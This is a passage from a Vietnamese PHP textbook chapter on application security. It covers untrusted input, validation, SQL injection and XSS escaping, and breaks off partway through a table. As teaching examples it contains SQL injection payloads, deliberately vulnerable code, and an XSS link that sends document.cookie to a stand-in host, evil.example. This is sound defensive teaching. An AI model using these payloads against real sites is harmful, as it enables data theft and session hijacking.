# Chương 17. Bảo mật ứng dụng PHP

> [← Mục lục](README.md) · [← Chương 16: PHP làm việc với database](16-php-va-database.md) · [Chương 18: PHP-FPM, Nginx và OPcache trên production →](18-fpm-nginx-opcache.md)

**Bạn sẽ học được:**

- Tư duy nền của bảo mật: mọi dữ liệu từ bên ngoài đều không đáng tin, kiểm tra đầu vào và mã hoá
  đầu ra là hai việc khác nhau, chọn allowlist thay vì denylist.
- Cơ chế và cách chặn các lỗ hổng web kinh điển trong PHP: SQL injection, XSS (escape theo ngữ cảnh),
  CSRF, command injection, path traversal, include file theo input, object injection qua
  `unserialize()`.
- Lưu mật khẩu đúng cách với `password_hash`/`password_verify`/`password_needs_rehash` (bcrypt cost 12
  mặc định từ PHP 8.4, Argon2id); sinh token bằng `random_bytes`/`random_int`; so bí mật bằng
  `hash_equals`; hiểu vì sao `==` để lọt *magic hash*.
- Mã hoá dữ liệu bằng extension `sodium` mà không phải tự chọn thuật toán.
- Cấu hình PHP an toàn cho production (`display_errors`, `expose_php`, `open_basedir`,
  `disable_functions`...), kiểm tra dependency bằng `composer audit`, giữ secret ngoài source code.

**Cần biết trước:** [Chương 04](04-kieu-du-lieu.md) (`==` và `===`, numeric string),
[Chương 05](05-chuoi.md) (chuỗi, byte và ký tự), [Chương 10](10-oop-nang-cao.md) mục 11
(`serialize`/`unserialize`, magic method), [Chương 15](15-php-va-web.md) (request, cookie, session,
upload), [Chương 16](16-php-va-database.md) (PDO, prepared statement). Chương này nhắc lại ngắn gọn
những gì cần dùng.

## 1. Tư duy bảo mật: không tin input

### 1.1 Bảo mật ứng dụng là gì

Một *lỗ hổng* (*vulnerability*) là chỗ ứng dụng làm một việc mà người viết không định cho phép: cho
người lạ đọc dữ liệu của người khác, cho ai đó chạy lệnh trên server, cho một trang web khác thao tác
thay người dùng. *Kẻ tấn công* (*attacker*) là bất kỳ ai cố ý gửi dữ liệu "lạ" vào ứng dụng để kích
hoạt những hành vi đó. Họ không cần quyền gì đặc biệt: chỉ cần gửi được một HTTP request, mà ai có
trình duyệt hoặc lệnh `curl` cũng làm được.

Thường người ta chia hậu quả thành ba nhóm, ứng với ba thứ cần bảo vệ:

| Thứ cần bảo vệ | Tiếng Anh | Bị phá thì trông thế nào |
|---|---|---|
| Bí mật | *Confidentiality* | Lộ dữ liệu: bảng `users` bị dump, đọc được file `.env` |
| Toàn vẹn | *Integrity* | Dữ liệu bị sửa trái phép: đổi giá đơn hàng, tự nâng quyền admin |
| Sẵn sàng | *Availability* | Dịch vụ sập hoặc chậm tới mức không dùng được (DoS) |

Điểm cần nhớ ngay từ đầu: phần lớn lỗ hổng trong ứng dụng web **không** nằm ở PHP hay ở thư viện, mà ở
code ứng dụng xử lý dữ liệu từ bên ngoài sai cách. PHP cho bạn đủ công cụ để làm đúng; chương này dạy
cách dùng chúng.

### 1.2 Input là gì: mọi thứ đến từ ngoài code của bạn

*Input không tin cậy* (*untrusted input*) là mọi dữ liệu mà kẻ tấn công có thể ảnh hưởng tới, dù trực
tiếp hay gián tiếp. Danh sách dài hơn người mới thường nghĩ:

| Nguồn | Trong PHP | Ghi chú |
|---|---|---|
| Query string, form | `$_GET`, `$_POST`, `$_REQUEST` | Kể cả field ẩn (`<input type="hidden">`), select box: người dùng sửa được hết |
| Cookie | `$_COOKIE` | Lưu ở trình duyệt, người dùng sửa tuỳ ý |
| Header HTTP | `$_SERVER['HTTP_*']` | `User-Agent`, `Referer`, `X-Forwarded-For`, cả `Host` đều do client gửi |
| File upload | `$_FILES` | Tên file, `type` (MIME) và nội dung đều do client quyết định |
| Body thô | `file_get_contents('php://input')` | JSON, XML của API |
| Dữ liệu đã lưu | Kết quả query DB, file trên đĩa, cache | Có thể chính là input cũ của người dùng được lưu lại |
| Hệ thống khác | Response của API bên thứ ba, webhook, message queue | Bên kia có thể bị chiếm, hoặc có lỗi |

Hai dòng cuối hay bị quên. Một tên người dùng `O'Brien` được lưu vào DB an toàn bằng prepared
statement, nhưng nếu một job báo cáo sau đó đọc nó ra và **nối chuỗi** vào câu SQL khác, injection vẫn
xảy ra (gọi là *second-order*, mục 2.5). Nguồn gốc cuối cùng của dữ liệu vẫn là người dùng.

Hình dung ranh giới tin cậy (*trust boundary*) như sau:

```
          Không tin cậy                 │            Code của bạn
                                        │
  trình duyệt, curl, bot  ──request──▶  │  validate ──▶ xử lý ──▶ encode/escape ──▶ HTML, SQL,
  API bên thứ ba          ──response─▶  │  (đầu vào)              (đầu ra, theo     shell, đường
  DB, file, cache         ──đọc ra───▶  │                         đích đến)          dẫn file...
                                        │
                           ranh giới tin cậy
```

Dữ liệu đi qua ranh giới thì phải được kiểm tra; dữ liệu đi ra một "trình thông dịch" khác (DB hiểu
SQL, trình duyệt hiểu HTML/JS, shell hiểu lệnh) thì phải được mã hoá cho đúng trình thông dịch đó.

⚠️ `$_SERVER` có cả giá trị do web server đặt (`REMOTE_ADDR` là địa chỉ IP của đầu bên kia kết nối
TCP mà web server nhận; nếu đứng sau load balancer thì đó là IP của load balancer) lẫn giá trị lấy
từ header client gửi (`HTTP_HOST`, `HTTP_X_FORWARDED_FOR`). Đừng tin `X-Forwarded-For` trừ khi
nó do proxy của chính bạn đặt; đừng dùng `HTTP_HOST` để dựng link trong email reset mật khẩu mà không
so với danh sách domain hợp lệ, vì kẻ tấn công gửi được `Host: evil.example` và link reset trỏ về site
của họ.

### 1.3 Validate đầu vào và escape đầu ra là hai việc khác nhau

Có hai loại xử lý, làm ở hai thời điểm khác nhau:

1. *Validate* (kiểm tra đầu vào): ngay khi nhận, kiểm tra dữ liệu có đúng **hình dạng nghiệp vụ** không:
   tuổi là số nguyên 1 tới 120, email đúng định dạng, trạng thái thuộc tập `{'draft', 'published'}`.
   Sai thì từ chối (trả lỗi 422), không cố "sửa" cho đúng.
2. *Escape* hay *encode* (mã hoá đầu ra): ngay **trước khi** đưa dữ liệu vào một ngữ cảnh có cú pháp
   riêng (HTML, SQL, shell, URL), biến nó thành dạng mà ngữ cảnh đó hiểu là "dữ liệu", không phải
   "lệnh". Cách mã hoá phụ thuộc vào **đích đến**, không phụ thuộc vào nguồn.

Vì sao không gộp thành một bước "làm sạch input" lúc nhận? Vì lúc nhận bạn chưa biết dữ liệu sẽ đi
đâu. Cùng một chuỗi `O'Brien <b>` có thể được in ra HTML (cần đổi `<` thành `&lt;`), đưa vào SQL (cần
bind tham số), ghi vào CSV, gửi qua JSON. Escape cho HTML rồi lưu vào DB thì dữ liệu trong DB bị
"bẩn" (`&lt;b&gt;`), xuất ra JSON cho app mobile sẽ thấy rác, và vẫn không an toàn khi đưa vào shell.
PHP từng thử cách "làm sạch lúc nhận" với tính năng `magic_quotes_gpc` (tự thêm `\` trước dấu nháy
trong mọi input), và đã gỡ bỏ hẳn ở PHP 5.4 vì nó vừa không đủ an toàn vừa làm hỏng dữ liệu.

Trong PHP thuần, công cụ validate có sẵn là `filter_var()`:

```php
<?php
declare(strict_types=1);

// Giả lập dữ liệu gửi lên (trong web thật là $_GET / $_POST, luôn là string hoặc array)
$input = ['page' => '3', 'age' => '12abc', 'email' => 'an@example.com'];

var_dump(filter_var($input['page'], FILTER_VALIDATE_INT));   // in ra: int(3)
var_dump(filter_var($input['age'], FILTER_VALIDATE_INT));    // in ra: bool(false)
var_dump(filter_var('150', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 1, 'max_range' => 120],
]));                                                          // in ra: bool(false)
var_dump(filter_var($input['email'], FILTER_VALIDATE_EMAIL)); // in ra: string(14) "an@example.com"
var_dump(filter_var('an@@example', FILTER_VALIDATE_EMAIL));   // in ra: bool(false)

// Hợp lệ nhưng giá trị là 0: phải so === false, không dùng if (!$x)
var_dump(filter_var('0', FILTER_VALIDATE_INT));               // in ra: int(0)

// Cờ FILTER_NULL_ON_FAILURE: sai thì trả null thay vì false (hữu ích với bool)
var_dump(filter_var('yes', FILTER_VALIDATE_BOOL, FILTER_NULL_ON_FAILURE));   // in ra: bool(true)
var_dump(filter_var('maybe', FILTER_VALIDATE_BOOL, FILTER_NULL_ON_FAILURE)); // in ra: NULL

// ⚠️ FILTER_VALIDATE_URL chỉ kiểm cú pháp URL, KHÔNG kiểm scheme an toàn
var_dump(filter_var('javascript://comment%0Aalert(1)', FILTER_VALIDATE_URL));
// in ra: string(31) "javascript://comment%0Aalert(1)"
```

Ba điều rút ra từ ví dụ:

- `filter_var` trả về giá trị đã chuyển kiểu (`int(3)` chứ không phải `"3"`), hoặc `false` khi sai.
  Giá trị hợp lệ `0` cũng "falsy", nên luôn kiểm bằng `=== false`.
- Validate định dạng không thay được kiểm tra nghiệp vụ. Một URL "hợp lệ" vẫn có thể là
  `javascript:...`; muốn chỉ nhận link web thì phải kiểm thêm scheme là `http` hoặc `https` (mục 3.4).
- Trong Laravel, validation nằm ở `$request->validate([...])` và Form Request
  ([Chương 25](25-laravel-request-validation-response.md)); nguyên tắc giống hệt.

### 1.4 Các nguyên tắc nền

Những nguyên tắc dưới đây lặp lại ở mọi mục sau, nên nắm trước:

- *Allowlist* tốt hơn *denylist*. Allowlist là "chỉ nhận những gì nằm trong danh sách cho phép";
  denylist là "chặn những gì nằm trong danh sách xấu". Danh sách xấu luôn thiếu: chặn đuôi `.php` thì
  kẻ tấn công thử `.phtml`, `.pHp`; chặn `../` thì họ gửi `..%2f` hay `....//`. Danh sách tốt thì
  bạn biết chắc, vì chính bạn định nghĩa nghiệp vụ.
- *Defense in depth* (phòng thủ nhiều lớp): không trông vào một lớp duy nhất. Prepared statement chặn
  SQL injection, nhưng tài khoản DB của app vẫn chỉ nên có quyền tối thiểu, để nếu lớp đầu lọt thì
  thiệt hại bị giới hạn.
- *Least privilege* (quyền tối thiểu): mỗi thành phần chỉ có đúng quyền nó cần. User DB của web không
  cần quyền `DROP`; process PHP-FPM không cần quyền ghi vào thư mục chứa code.
- *Fail closed* (lỗi thì từ chối): khi có gì bất thường (không đọc được token, không xác định được
  quyền), mặc định là từ chối chứ không cho qua.
- Không tự chế crypto, không tự viết parser, không tự viết hàm escape. Dùng hàm có sẵn của PHP hoặc
  thư viện đã được kiểm nghiệm.
- Giữ mọi thứ cập nhật: PHP, extension, package Composer (mục 13). Nhiều vụ tấn công lớn khai thác lỗ
  hổng đã có bản vá từ lâu.

### 1.5 Bản đồ chương

Mỗi lỗ hổng trong chương gắn với một "trình thông dịch" mà dữ liệu được đưa vào:

| Lỗ hổng | Dữ liệu bị hiểu nhầm thành | Cách chặn chính | Mục |
|---|---|---|---|
| SQL injection | Câu lệnh SQL | Prepared statement, allowlist tên cột | 2 |
| XSS | HTML, JavaScript trong trình duyệt | Escape theo ngữ cảnh khi xuất | 3 |
| CSRF | Request do người dùng chủ động gửi | CSRF token, `SameSite`, kiểm origin | 4 |
| Lưu mật khẩu yếu | (dữ liệu bị lộ thì bẻ được) | `password_hash` | 5 |
| Token đoán được, so sánh lỏng | Bí mật | `random_bytes`, `hash_equals` | 6, 7 |
| Dữ liệu nhạy cảm để trần | (dữ liệu bị lộ thì đọc được) | Mã hoá bằng `sodium` | 8 |
| Upload, path traversal, LFI | Đường dẫn file, code PHP | Tên do server sinh, allowlist | 9 |
| Object injection | Object PHP và magic method | Không `unserialize` input, dùng JSON | 10 |
| Command injection | Lệnh shell | Không gọi shell, `escapeshellarg` | 11 |
| Cấu hình sai | (lộ thông tin, mở rộng tấn công) | `php.ini` production | 12 |
| Dependency có lỗ hổng | Code của người khác | `composer audit` | 13 |
| Lộ secret | Khoá, mật khẩu DB | `.env` ngoài git, secret manager | 14 |

Chương này dùng PHP thuần để bạn thấy cơ chế. Laravel làm sẵn nhiều thứ (Blade tự escape, middleware
CSRF, hasher, Eloquent bind tham số); các chương Laravel sẽ chỉ ra chỗ framework lo và chỗ bạn vẫn phải
tự lo.

## 2. SQL injection

### 2.1 Cơ chế: dữ liệu bị hiểu thành câu lệnh

*SQL injection* (SQLi) xảy ra khi input được **nối chuỗi** vào câu SQL, và DB hiểu một phần của input
như cú pháp SQL chứ không phải như một giá trị. Ví dụ dưới đây dùng SQLite trong bộ nhớ để bạn chạy
được ngay (PHP có sẵn `pdo_sqlite`); cơ chế với MySQL giống hệt.

```php
<?php
declare(strict_types=1);

// SQLite trong bộ nhớ để ai cũng chạy được; cơ chế injection y hệt với MySQL.
$pdo = new PDO('sqlite::memory:');
$pdo->exec('CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, role TEXT)');
$pdo->exec("INSERT INTO users (email, role) VALUES
    ('an@example.com', 'user'), ('binh@example.com', 'admin')");

// ❌ Nối chuỗi: input trở thành một phần câu lệnh
function findUserUnsafe(PDO $pdo, string $email): array
{
    $sql = "SELECT id, email, role FROM users WHERE email = '$email'";
    echo "SQL: $sql\n";
    return $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);
}

// ✅ Prepared statement: câu lệnh cố định, giá trị đi riêng
function findUserSafe(PDO $pdo, string $email): array
{
    $stmt = $pdo->prepare('SELECT id, email, role FROM users WHERE email = ?');
    $stmt->execute([$email]);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

$normal = 'an@example.com';
$evil   = "x' OR '1'='1";

echo count(findUserUnsafe($pdo, $normal)), "\n";
// in ra: SQL: SELECT id, email, role FROM users WHERE email = 'an@example.com'
// in ra: 1
echo count(findUserUnsafe($pdo, $evil)), "\n";
// in ra: SQL: SELECT id, email, role FROM users WHERE email = 'x' OR '1'='1'
// in ra: 2        <- trả về MỌI user
echo count(findUserSafe($pdo, $evil)), "\n";
// in ra: 0        <- chỉ tìm user có email đúng bằng chuỗi "x' OR '1'='1"
```

Dấu `'` trong input đóng chuỗi SQL sớm, phần còn lại (`OR '1'='1'`) trở thành điều kiện mới luôn đúng.
Người viết code định cho người dùng nhập **một giá trị**, nhưng thực tế đã cho họ viết **một phần câu
lệnh**.

Kẻ tấn công làm được gì tuỳ vào câu lệnh bị chèn. Vài dạng kinh điển (cú pháp MySQL, chỉ để hình
dung; trong MySQL `-- ` cần có khoảng trắng sau hai dấu gạch mới là comment, `#` cũng là comment):

| Dạng | Input mẫu | Hậu quả |
|---|---|---|
| Bỏ qua điều kiện | username `admin' -- ` | `WHERE username = 'admin' -- ' AND password = ...`: phần kiểm mật khẩu thành comment, đăng nhập không cần mật khẩu |
| UNION | `' UNION SELECT email, password FROM users -- ` | Ghép kết quả một câu `SELECT` khác vào response: đọc bảng bất kỳ |
| Blind | `' AND SLEEP(5) -- ` | Response không hiện dữ liệu, nhưng đo thời gian hoặc khác biệt response để suy ra từng bit |
| Sửa dữ liệu | Chèn vào câu `UPDATE` | Đổi cột khác ngoài cột được phép, hoặc mọi dòng |

Hậu quả thực tế thường là lộ toàn bộ DB (kể cả hash mật khẩu, mục 5 giải thích vì sao lúc đó hash
chậm cứu bạn).

### 2.2 Prepared statement: vì sao chặn được

*Prepared statement* (câu lệnh có tham số) tách **khung câu lệnh** khỏi **giá trị**:

```
  App                                   MySQL server
   │  1. PREPARE "SELECT ... WHERE email = ?"  │
   │ ────────────────────────────────────────▶ │  parse, chốt cấu trúc câu lệnh
   │  2. EXECUTE với giá trị "x' OR '1'='1"    │
   │ ────────────────────────────────────────▶ │  giá trị chỉ được dùng như MỘT chuỗi,
   │                                           │  không bao giờ được parse lại thành SQL
```

Cấu trúc câu lệnh đã chốt ở bước 1, nên dù giá trị có chứa `'`, `OR`, `--`, nó cũng chỉ là nội dung
của một chuỗi. Manual PHP ghi rõ: nếu ứng dụng **chỉ** dùng prepared statement, bạn chắc chắn không
có SQL injection, trừ khi những phần khác của câu lệnh được dựng từ input chưa xử lý.

⚠️ Chi tiết với MySQL: `PDO_MYSQL` mặc định dùng *emulated prepares*, tức PDO tự escape giá trị và
ghép thành câu SQL hoàn chỉnh ở phía PHP rồi mới gửi đi, không phải hai bước như hình trên. Cách này
vẫn an toàn **khi charset của kết nối được khai trong DSN** (`mysql:host=...;dbname=...;charset=utf8mb4`),
vì hàm escape dựa vào charset đó. Manual PHP cảnh báo: đổi charset bằng câu lệnh `SET NAMES` **không**
ảnh hưởng tới hàm escape, và với một số charset nhiều byte, sự lệch này mở ra lỗ hổng. Quy tắc đơn
giản: luôn khai `charset=utf8mb4` trong DSN, không dùng `SET NAMES`. Cách cấu hình PDO cho MySQL (kể
cả tắt emulate) ở [Chương 16](16-php-va-database.md).

Đừng thay prepared statement bằng việc tự escape (`addslashes`, `PDO::quote`, `mysqli_real_escape_string`).
Tự escape dễ quên ở một chỗ, phụ thuộc charset, và hoàn toàn vô dụng khi giá trị không nằm trong
dấu nháy:

```php
<?php
declare(strict_types=1);

$pdo = new PDO('sqlite::memory:');
$pdo->exec('CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, role TEXT)');
$pdo->exec("INSERT INTO users (email, role) VALUES
    ('an@example.com', 'user'), ('binh@example.com', 'admin')");

$id = '1 OR 1=1';                               // "id" lấy từ ?id=...
$sql = 'SELECT email FROM users WHERE id = ' . addslashes($id);
echo $sql, "\n";                                // in ra: SELECT email FROM users WHERE id = 1 OR 1=1
echo count($pdo->query($sql)->fetchAll()), "\n"; // in ra: 2   <- addslashes không có gì để escape
```

### 2.3 Những chỗ placeholder không giúp được

Placeholder `?` (hoặc `:ten`) chỉ thay được một **giá trị**. Nó không thay được tên bảng, tên cột,
từ khoá `ASC`/`DESC`, hay một đoạn cú pháp. Những chỗ này phải dùng allowlist: input chỉ được dùng để
**chọn** một chuỗi SQL cố định trong code, không bao giờ được nối thẳng.

```php
<?php
declare(strict_types=1);

$pdo = new PDO('sqlite::memory:');
$pdo->exec('CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price INTEGER, created_at TEXT)');
$pdo->exec("INSERT INTO products (name, price, created_at) VALUES
    ('Bút bi', 5000, '2026-01-10'), ('Vở 100%', 12000, '2026-02-01'), ('Thước', 8000, '2026-03-15')");

// 1) Tên cột và hướng sắp xếp: không bind được, phải chọn từ allowlist
const SORTABLE = ['name' => 'name', 'price' => 'price', 'newest' => 'created_at'];

function listProducts(PDO $pdo, string $sort, string $dir): array
{
    $column    = SORTABLE[$sort] ?? 'id';            // input chỉ dùng để CHỌN một giá trị có sẵn
    $direction = $dir === 'desc' ? 'DESC' : 'ASC';
    $sql = "SELECT name FROM products ORDER BY {$column} {$direction}";
    return $pdo->query($sql)->fetchAll(PDO::FETCH_COLUMN);
}

echo implode(', ', listProducts($pdo, 'price', 'desc')), "\n";
// in ra: Vở 100%, Thước, Bút bi
echo implode(', ', listProducts($pdo, 'price; DROP TABLE products', 'x')), "\n";
// in ra: Bút bi, Vở 100%, Thước     <- không khớp allowlist, rơi về ORDER BY id ASC

// 2) Danh sách IN (...): sinh đúng số dấu ? rồi bind từng giá trị
$ids = [1, 3];
$placeholders = implode(', ', array_fill(0, count($ids), '?'));   // "?, ?"
$stmt = $pdo->prepare("SELECT name FROM products WHERE id IN ($placeholders)");
$stmt->execute($ids);
echo implode(', ', $stmt->fetchAll(PDO::FETCH_COLUMN)), "\n";
// in ra: Bút bi, Thước

// 3) LIKE: % và _ trong input là ký tự đại diện; muốn tìm đúng chữ thì escape chúng
function likeContains(string $term): string
{
    return '%' . str_replace(['!', '%', '_'], ['!!', '!%', '!_'], $term) . '%';
}
$stmt = $pdo->prepare("SELECT name FROM products WHERE name LIKE ? ESCAPE '!'");
$stmt->execute(['%']);                    // không escape: '%' khớp mọi dòng
echo count($stmt->fetchAll()), "\n";      // in ra: 3
$stmt->execute([likeContains('%')]);      // escape: chỉ tìm tên có chứa ký tự %
echo implode(', ', $stmt->fetchAll(PDO::FETCH_COLUMN)), "\n";
// in ra: Vở 100%
```

Ghi chú cho từng phần:

- Phần 1: chuỗi SQL cuối cùng chỉ có thể là một trong số ít tổ hợp bạn viết sẵn. Input lạ không gây
  lỗi, chỉ rơi về mặc định.
- Phần 2: mảng rỗng sinh ra `IN ()`, là lỗi cú pháp; kiểm `$ids !== []` trước. Nhớ validate từng phần
  tử là số nguyên nếu nghiệp vụ yêu cầu.
- Phần 3 không phải injection (giá trị vẫn được bind), mà là lỗi logic: người dùng gõ `%` thì khớp mọi
  thứ, và mẫu `%...%` dài có thể làm query chậm. `ESCAPE '!'` chọn `!` làm ký tự escape cho `LIKE`, cú
  pháp này chạy được cả trên MySQL lẫn SQLite.

### 2.4 Injection trong framework và ORM

Query builder và ORM (Laravel Eloquent, Doctrine) bind tham số giùm bạn, nên `where('email', $email)`
an toàn. Nhưng chúng đều có "cửa thoát" cho SQL thô, và ở đó trách nhiệm quay về bạn:

- Laravel `whereRaw`, `selectRaw`, `orderByRaw`, `DB::raw`, `DB::statement`: chuỗi bạn truyền vào được
  đưa nguyên văn vào câu SQL. Luôn dùng tham số bind thứ hai: `whereRaw('price > ?', [$min])`.
- Tên cột lấy từ input (`orderBy($request->sort)`) cũng phải qua allowlist như mục 2.3, vì PDO không
  bind được tên cột.

Chi tiết ở [Chương 27](27-laravel-database-eloquent.md).

### 2.5 Second-order injection và giới hạn thiệt hại

*Second-order injection* (injection bậc hai): input được lưu an toàn vào DB, rồi **lần sau** được đọc
ra và nối vào một câu SQL khác. Ví dụ người dùng đăng ký với tên `x' OR '1'='1`, tên được lưu bằng
prepared statement nên không sao; tuần sau một script xuất báo cáo đọc tên đó ra và nối vào
`DELETE FROM sessions WHERE username = '...'`. Bài học: không có khái niệm "dữ liệu lấy từ DB của mình
thì an toàn để nối chuỗi". Quy tắc đơn giản nhất là **chuỗi SQL luôn là hằng số trong code**, mọi giá
trị đều đi qua placeholder, bất kể nguồn.

Hai lớp phòng thủ thêm, để nếu SQLi vẫn lọt thì thiệt hại nhỏ:

- *Least privilege* cho tài khoản DB của app. User mà web dùng chỉ cần quyền đọc ghi dữ liệu, không
  cần `DROP`, `GRANT`, `FILE`:

  ```sql
  -- MySQL 8.4: user riêng cho ứng dụng, chỉ có quyền trên schema shop
  CREATE USER 'shop_app'@'%' IDENTIFIED BY 'mat-khau-dai-ngau-nhien';
  GRANT SELECT, INSERT, UPDATE, DELETE ON shop.* TO 'shop_app'@'%';
  ```

- Không hiển thị lỗi SQL cho người dùng. Thông báo lỗi chứa câu SQL giúp kẻ tấn công dò cấu trúc rất
  nhanh. Ghi lỗi vào log, trả trang lỗi chung (mục 12).

## 3. XSS và escape theo ngữ cảnh

### 3.1 XSS là gì

*XSS* (*Cross-Site Scripting*) xảy ra khi kẻ tấn công đưa được HTML hoặc JavaScript của họ vào trang
của bạn, và trình duyệt của **người khác** chạy nó. Script đó chạy với origin của site bạn, nên làm
được mọi thứ nạn nhân làm được: gửi request thay nạn nhân, đọc dữ liệu trên trang, hiện form đăng nhập
giả ngay trên domain thật.

Lỗi gốc rất giống SQL injection: dữ liệu được ghép vào HTML, và trình duyệt hiểu một phần dữ liệu là
cú pháp HTML/JS.

```php
<?php
declare(strict_types=1);

$q = $_GET['q'] ?? '';
echo "<p>Kết quả tìm kiếm cho: $q</p>";   // ❌ in thẳng input ra HTML
// Kẻ tấn công gửi cho nạn nhân link: /search.php?q=<script>fetch('https://evil.example/?c='+document.cookie)</script>
// Trình duyệt nạn nhân nhận về <p>Kết quả tìm kiếm cho: <script>...</script></p> và chạy script.
```

Ba loại XSS, phân theo nơi payload nằm:

| Loại | Payload nằm ở đâu | Ví dụ |
|---|---|---|
| *Reflected* | Trong request (thường là URL); server in lại vào response | Trang tìm kiếm ở trên; nạn nhân phải bấm link độc |
| *Stored* | Được lưu (DB, file) rồi hiện cho mọi người xem | Bình luận chứa `<script>`; ai mở trang cũng dính |
| *DOM-based* | JavaScript phía trình duyệt tự lấy dữ liệu (URL, `location.hash`) và ghi vào trang qua API nguy hiểm như `innerHTML`; server không tham gia | `el.innerHTML = location.hash.slice(1)` |

Stored XSS nguy hiểm nhất vì không cần lừa ai bấm link. DOM-based nằm hoàn toàn trong code JavaScript
nên escape phía PHP không giúp được; cách chặn là dùng API an toàn như `textContent` thay vì
`innerHTML`.

### 3.2 `htmlspecialchars`: escape cho ngữ cảnh HTML

*Escape* HTML là đổi các ký tự có nghĩa cú pháp thành *HTML entity*, để trình duyệt hiển thị chúng như
chữ chứ không hiểu là thẻ. `htmlspecialchars()` đổi đúng năm ký tự:

| Ký tự | Thành |
|---|---|
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#039;` (với `ENT_HTML401`, mặc định) hoặc `&apos;` (với `ENT_HTML5`, `ENT_XML1`, `ENT_XHTML`) |
| `<` | `&lt;` |
| `>` | `&gt;` |

Chữ ký hàm:

```php
htmlspecialchars(
    string $string,
    int $flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,
    ?string $encoding = null,          // null: lấy theo ini default_charset (mặc định "UTF-8")
    bool $double_encode = true
): string
```

Ý nghĩa các flag mặc định:

- `ENT_QUOTES`: escape cả nháy đơn lẫn nháy kép, nên dùng an toàn cho thuộc tính đặt trong `'...'` hay
  `"..."`.
- `ENT_SUBSTITUTE`: chuỗi chứa byte không hợp lệ theo encoding thì thay bằng ký tự `U+FFFD` (�), thay
  vì trả về chuỗi rỗng.

⚠️ Mặc định này chỉ có **từ PHP 8.1**. Trước 8.1, mặc định là `ENT_COMPAT | ENT_HTML401`: **không**
escape nháy đơn, và chuỗi có byte UTF-8 hỏng thì trả về `""`. Chạy cùng một đoạn code:

```php
<?php
declare(strict_types=1);

echo htmlspecialchars("O'Reilly <b>"), "\n";
// PHP 8.0: O'Reilly &lt;b&gt;          <- nháy đơn giữ nguyên
// PHP 8.1+: O&#039;Reilly &lt;b&gt;
var_dump(htmlspecialchars("abc\xFF"));    // \xFF không phải UTF-8 hợp lệ
// PHP 8.0: string(0) ""
// PHP 8.1+: string(6) "abc�"
```

Vì code thư viện có thể chạy trên nhiều bản PHP, và để người đọc code thấy ngay ý định, thói quen tốt là
gói vào một hàm nhỏ và **luôn truyền đủ tham số**:

```php
<?php
declare(strict_types=1);

/** Escape cho nội dung HTML và giá trị thuộc tính CÓ nháy. */
function e(string $s): string
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

echo '<p>Xin chào ', e('<script>alert(1)</script>'), '</p>', "\n";
// in ra: <p>Xin chào &lt;script&gt;alert(1)&lt;/script&gt;</p>
echo '<input value="', e('" autofocus onfocus="alert(1)'), '">', "\n";
// in ra: <input value="&quot; autofocus onfocus=&quot;alert(1)">
echo e('a &amp; b'), "\n";
// in ra: a &amp;amp; b      <- mặc định double_encode = true: & nào cũng bị escape lại
```

Hai lưu ý khi dùng:

- Escape **ngay lúc in ra**, không escape lúc lưu vào DB (mục 1.3). Dữ liệu escape hai lần thì người
  dùng thấy `&amp;amp;` trên màn hình; đó là dấu hiệu bạn đang escape sai chỗ.
- Charset truyền vào phải trùng với charset của trang (`Content-Type: text/html; charset=UTF-8`).
  Lệch charset là một nguồn bypass kinh điển.

Trong template PHP thuần, mẫu quen thuộc là `<?= e($user['name']) ?>`. Laravel Blade làm sẵn việc này:
`{{ $x }}` biên dịch thành lời gọi helper `e()`, hàm này gọi đúng
`htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8', $doubleEncode)`. Còn `{!! $x !!}` in
nguyên văn, không escape ([Chương 25](25-laravel-request-validation-response.md)).

### 3.3 Escape theo ngữ cảnh

`htmlspecialchars` chỉ đúng cho **hai** ngữ cảnh: nội dung giữa các thẻ, và giá trị thuộc tính có
nháy. Trình duyệt parse HTML, thuộc tính, JavaScript, URL, CSS theo những luật khác nhau, nên một chuỗi
"đã escape" cho ngữ cảnh này vẫn có thể nguy hiểm ở ngữ cảnh khác. Quy tắc: **hỏi dữ liệu sẽ được đặt
vào đâu, rồi chọn cách mã hoá cho đúng chỗ đó.**

```php
<?php
declare(strict_types=1);

function e(string $s): string
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// 1) Thuộc tính KHÔNG có nháy: escape vô dụng vì dấu cách đủ để thêm thuộc tính mới
$theme = 'x onmouseover=alert(1)';
echo '<div class=', e($theme), '>', "\n";
// in ra: <div class=x onmouseover=alert(1)>      <- ❌ không có ký tự nào để escape
echo '<div class="', e($theme), '">', "\n";
// in ra: <div class="x onmouseover=alert(1)">    <- ✅ có nháy: cả chuỗi chỉ là giá trị của class

// 2) Một tham số trong URL: URL-encode giá trị trước, rồi escape HTML cả URL
echo '<a href="/search?q=', e(rawurlencode('a&b=c d/é')), '">', "\n";
// in ra: <a href="/search?q=a%26b%3Dc%20d%2F%C3%A9">
echo '<a href="/search?', e(http_build_query(['q' => 'a&b=c d', 'page' => 2])), '">', "\n";
// in ra: <a href="/search?q=a%26b%3Dc+d&amp;page=2">

// 3) Dữ liệu cho JavaScript: dùng json_encode với các cờ JSON_HEX_*
$data = ['name' => '</script><script>alert(1)</script>', 'q' => "it's \"ok\" & <b>"];
$json = json_encode($data, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT | JSON_THROW_ON_ERROR);
echo '<script>const data = ', $json, ';</script>', "\n";
// in ra: <script>const data = {"name":"\u003C\/script\u003E\u003Cscript\u003Ealert(1)\u003C\/script\u003E","q":"it\u0027s \u0022ok\u0022 \u0026 \u003Cb\u003E"};</script>

// 4) Hoặc đặt JSON vào thuộc tính data-*, rồi JS đọc bằng JSON.parse(el.dataset.props)
echo '<div id="app" data-props="', e(json_encode($data, JSON_THROW_ON_ERROR)), '"></div>', "\n";
// in ra: <div id="app" data-props="{&quot;name&quot;:&quot;&lt;\/script&gt;...&quot;}"></div>   (rút gọn)
```

Giải thích từng ngữ cảnh:

| Ngữ cảnh | Ví dụ | Cách làm đúng |
|---|---|---|
| Nội dung HTML | `<p>DATA</p>` | `htmlspecialchars` |
